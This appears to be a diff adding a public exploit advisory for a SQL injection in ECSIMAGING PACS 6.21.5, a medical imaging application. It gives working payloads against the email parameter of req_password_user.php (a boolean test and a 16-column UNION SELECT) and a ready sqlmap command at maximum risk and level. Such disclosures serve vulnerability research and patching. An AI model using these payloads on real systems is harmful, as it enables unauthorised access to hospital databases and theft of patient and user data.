@@ -1,0 +1,14 @@
+# Exploit Title: ECSIMAGING PACS 6.21.5 - SQL injection
+# Date: 06/01/2021
+# Exploit Author: shoxxdj
+# Vendor Homepage: https://www.medicalexpo.fr/
+# Version: 6.21.5 and bellow ( tested on 6.21.5,6.21.3 )
+# Tested on: Linux
+
+ECSIMAGING PACS Application in 6.21.5 and bellow suffers from  SQLinjection vulnerability
+The parameter email is sensitive to SQL Injection (selected_db can be leaked in the parameters )
+
+Payload example : /req_password_user.php?email=test@test.com' OR NOT 9856=9856-- nBwf&selected_db=xtp001
+/req_password_user.php?email=test@test.com'+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16+--+&selected_db=xtp001
+
+SQLMAP :  sqlmap.py -u '<URL>/req_password_user.php?email=test@test.com&selected_db=xtp001' --risk=3 --level=5
